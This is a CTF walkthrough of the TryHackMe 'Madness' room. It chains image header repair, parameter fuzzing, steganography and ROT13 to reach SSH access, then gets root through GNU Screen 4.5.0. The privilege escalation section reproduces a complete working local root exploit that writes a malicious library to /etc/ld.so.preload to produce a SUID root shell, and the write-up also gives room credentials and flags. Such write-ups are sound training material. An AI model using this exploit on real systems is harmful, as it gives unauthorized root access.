---
title: "Madness"
description: "A tricky easy room chaining corrupted image header repair, parameter fuzzing, ROT13 decoding, layered steganography, and the GNU Screen 4.5.0 SUID exploit for root."
difficulty: "Easy"
tags: ["Steganography", "Image Header", "ROT13", "Parameter Fuzzing", "SUID", "Screen 4.5.0", "CVE-2017-5618", "Exploit-DB 41154"]
date: "2026-08-04"
---

## Overview

Madness is an easy-difficulty room from the Turmoil series on TryHackMe — but "easy" undersells it. The path to root is a chain of layered tricks: a broken image whose corrupted header hides a directory, a numeric parameter that must be brute-forced, steganography that leaks a ROT13-encoded username, a second stego payload that hides the SSH password, and finally an outdated SUID binary with a public local root exploit.

## Room Information

- **Platform:** TryHackMe
- **Difficulty:** Easy
- **Skills Learned:** Image header repair, parameter fuzzing, ROT13 decoding, steganography, SUID binary exploitation

## Enumeration

### Nmap Scan

```bash
nmap -sV -sC -oN nmap.txt <target-ip>
```

![Nmap scan results](/assets/screenshots/madness/nmap.png)

| Port | Service | Version |
|------|---------|---------|
| 22/tcp | SSH | OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 |
| 80/tcp | HTTP | Apache httpd 2.4.18 |

### The Modified Apache Default Page

Port 80 serves the standard Apache2 Ubuntu default page — at first glance. Directory brute forcing finds nothing, but the source code tells a different story:

![Apache default page](/assets/screenshots/madness/homepage.png)

Embedded in the page source is a suspicious comment and a reference to an image:

![Source code comment](/assets/screenshots/madness/source_comment.png)

The comment "They will never find me" points to `thm.jpg`, which is broken and won't render in the browser.

### Repairing the Corrupted Image Header

The file was downloaded and inspected:

```bash
wget http://<target-ip>/thm.jpg -O thm.jpg
file thm.jpg
xxd thm.jpg | head
```

![xxd hexdump of thm.jpg](/assets/screenshots/madness/xxd_hexdump.png)

The hexdump reveals the problem: the file starts with `89 50 4E 47 0D 0A 1A 0A` — that's the **PNG magic header**, but the file has a `.jpg` extension. Every file format is identified by its magic bytes, and a JPEG must start with `FF D8 FF E0`. The header was deliberately swapped to corrupt the file.

Fixing the magic bytes with a hex editor:

![Fixing the header with hexedit](/assets/screenshots/madness/hexedit_fix.png)

With the correct JPEG header restored, the image opens — and it reveals a hidden directory:

![Fixed image revealing hidden directory](/assets/screenshots/madness/hidden_dir_image.png)

The image points to `/th1s_1s_h1dd3n`.

## Initial Access

### The Hidden Directory

Visiting the hidden directory shows a page asking for a "secret":

![Hidden directory page](/assets/screenshots/madness/hidden_dir_page.png)

The source code reveals the range:

![Secret hint in source](/assets/screenshots/madness/secret_hint.png)

The secret is a number between 0 and 99.

### Brute-Forcing the Secret Parameter

Since the hint gives an exact range, the `secret` GET parameter can be fuzzed. A simple script iterates through all 100 values and compares response lengths — the correct value produces a much longer page:

```bash
seq 0 99 > nums.txt
ffuf -w nums.txt -u http://<target-ip>/th1s_1s_h1dd3n/?secret=FUZZ
```

![Secret brute-force script](/assets/screenshots/madness/secret_script.png)

The value **73** returns a significantly larger response:

![secret=73 output](/assets/screenshots/madness/secret_73.png)

Visiting `/th1s_1s_h1dd3n/?secret=73` reveals a password-like string: `y2RPJ4QaPF!B`

### Steganography on thm.jpg

That string is not a login credential itself — it's a **passphrase** for hidden data inside the repaired `thm.jpg`:

```bash
steghide extract -sf thm.jpg
Enter passphrase: y2RPJ4QaPF!B
```

![Steghide extraction](/assets/screenshots/madness/steghide_username.png)

This extracts `hidden.txt`:

```
Fine you found the password!

Here's a username

wbxre
```

The username `wbxre` is encoded — the room's hint says "There's something ROTten about this guys name!" ROT13 shifts each letter by 13 positions:

```bash
echo -n "wbxre" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
joker
```

![ROT13 decode](/assets/screenshots/madness/rot13_decode.png)

We have a username: **joker**.

### The Second Stego Layer — Password

The username alone isn't enough. The room's own header image (the Joker image shown in the challenge description) also contains hidden data. Extracting it with steghide — this time with **no passphrase**:

```bash
wget https://i.imgur.com/5iW7kC8.jpg
steghide extract -sf 5iW7kC8.jpg
```

![password.txt extraction](/assets/screenshots/madness/password_txt.png)

This yields `password.txt`:

```
I didn't think you'd find me! Congratulations!

Here take my password

*axA&GF8dP
```

### SSH Access

```bash
ssh joker@<target-ip>
Password: *axA&GF8dP
```

![SSH login as joker](/assets/screenshots/madness/ssh_login.png)

### User Flag

```bash
cat user.txt
```

![User flag](/assets/screenshots/madness/user_flag.png)

**User flag:** `THM{d5781e53b130efe2f94f9b0354a5e4ea}`

## Privilege Escalation — GNU Screen 4.5.0

### Finding SUID Binaries

Searching for binaries with the SUID bit set:

```bash
find / -perm -4000 -type f 2>/dev/null
```

![SUID binaries](/assets/screenshots/madness/suid_find.png)

Two entries stand out:

```
/bin/screen-4.5.0
/bin/screen-4.5.0.old
```

GNU Screen 4.5.0 has a known privilege escalation vulnerability — **CVE-2017-5618** (also referenced as CVE-2016-8781 in some writeups), documented in Exploit-DB 41154.

### How the Screen Exploit Works

The exploit abuses Screen's handling of the `LD_PRELOAD` environment through a flaw in how it writes to `/etc/ld.so.preload` when `-L` logging is used. When run as root (via the SUID bit), Screen can be tricked into writing an arbitrary file to `/etc/ld.so.preload`. The dynamic linker (`ld.so`) then loads whatever library is listed there for every subsequent process — including a malicious library with a constructor function that:

1. Changes the ownership of a prepared shell binary to root
2. Sets its SUID bit (04755)
3. Removes the `/etc/ld.so.preload` file to clean up

The result is a SUID root shell in `/tmp/rootshell`.

### The screenroot.sh Exploit

The exploit script (kept in the local room notes as `sc2`) creates the malicious library, the SUID shell, and triggers Screen:

```bash
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c

cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c

cd /etc
umask 000
screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"
screen -ls
/tmp/rootshell
```

Running the exploit:

```bash
chmod +x screenroot.sh
./screenroot.sh
```

![Running the screen exploit](/assets/screenshots/madness/exploit_run.png)

The exploit drops a root shell:

```bash
whoami
root
```

### Root Flag

```bash
cat /root/root.txt
```

![Root flag](/assets/screenshots/madness/root_flag.png)

**Root flag:** `THM{5ecd98aa66a6abb670184d7547c8124a}`

## Flags

| Flag | Location | Value |
|------|----------|-------|
| User | `/home/joker/user.txt` | `THM{d5781e53b130efe2f94f9b0354a5e4ea}` |
| Root | `/root/root.txt` | `THM{5ecd98aa66a6abb670184d7547c8124a}` |

## Commands Used

```bash
# Enumeration
nmap -sV -sC -oN nmap.txt <target-ip>

# Fix the corrupted image header (PNG -> JPEG)
xxd thm.jpg | head
hexedit thm.jpg  # change 89 50 4E 47 0D 0A 1A 0A to FF D8 FF E0 00 10 4A 46 49 46

# Find the secret parameter
seq 0 99 > nums.txt
ffuf -w nums.txt -u http://<target-ip>/th1s_1s_h1dd3n/?secret=FUZZ
# secret=73 reveals passphrase y2RPJ4QaPF!B

# Steganography
steghide extract -sf thm.jpg          # passphrase: y2RPJ4QaPF!B -> hidden.txt
echo -n "wbxre" | tr 'A-Za-z' 'N-ZA-Mn-za-m'   # ROT13 -> joker
steghide extract -sf 5iW7kC8.jpg      # no passphrase -> password.txt (*axA&GF8dP)

# SSH
ssh joker@<target-ip>
cat user.txt

# Privilege escalation
find / -perm -4000 -type f 2>/dev/null
# screen-4.5.0 SUID -> exploit screenroot.sh (Exploit-DB 41154)
./screenroot.sh
cat /root/root.txt
```

## Lessons Learned

- **Magic bytes are the first line of defense for file identification.** `file` reads the header, not the extension. A file with the wrong magic bytes is a common CTF trick — always run `file` and inspect with `xxd` when an image won't open. Knowing the standard signatures (JPEG `FF D8 FF`, PNG `89 50 4E 47`) lets you repair corrupted files.
- **Source code comments are the author's leak.** Both the hidden image reference and the 0-99 secret range were found in HTML comments. Viewing source is always worth doing before brute forcing blindly.
- **Parameters deserve fuzzing too.** Directory brute forcing is standard, but GET parameters are often forgotten. When a page hints at a numeric range, fuzz the parameter — response size differences make correct values easy to spot.
- **Steganography can be layered.** Data was hidden in two separate images, each with a different key. The passphrase for one image came from the web app, and the other image needed no passphrase at all. Always try steghide with and without a passphrase across all available images.
- **ROT13 is instantly recognizable and instantly decodable.** The room hint ("something ROTten") gave it away. `tr 'A-Za-z' 'N-ZA-Mn-za-m'` is a one-liner that should be memorized.
- **SUID binaries with known CVEs are a guaranteed root.** GNU Screen 4.5.0 shipped with a flaw that lets a setuid process write to `/etc/ld.so.preload`, hijacking the dynamic linker for every future process. Auditing SUID binaries with `find / -perm -4000` and cross-referencing with Exploit-DB is a core post-exploitation step.
- **The exploit's elegance matters for understanding.** The screenroot.sh chain — constructor function, SUID shell, ld.so.preload overwrite — demonstrates how a single writable loader file can escalate privileges system-wide.

## References

- [TryHackMe — Madness](https://tryhackme.com/room/madness)
- [Exploit-DB 41154 — GNU Screen 4.5.0 Local Privilege Escalation](https://www.exploit-db.com/exploits/41154)
- [GNU Screen Bug Report (2017)](https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html)
- [CVE-2017-5618 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2017-5618)
- [CyberChef — ROT13](https://gchq.github.io/CyberChef/#recipe=ROT13(true,true,false,false,false,false))
- [Steghide — SourceForge](http://steghide.sourceforge.net/)
- [GTFOBins — Screen](https://gtfobins.github.io/gtfobins/screen/)
- [Magic Bytes Reference — Wikipedia](https://en.wikipedia.org/wiki/List_of_file_signatures)
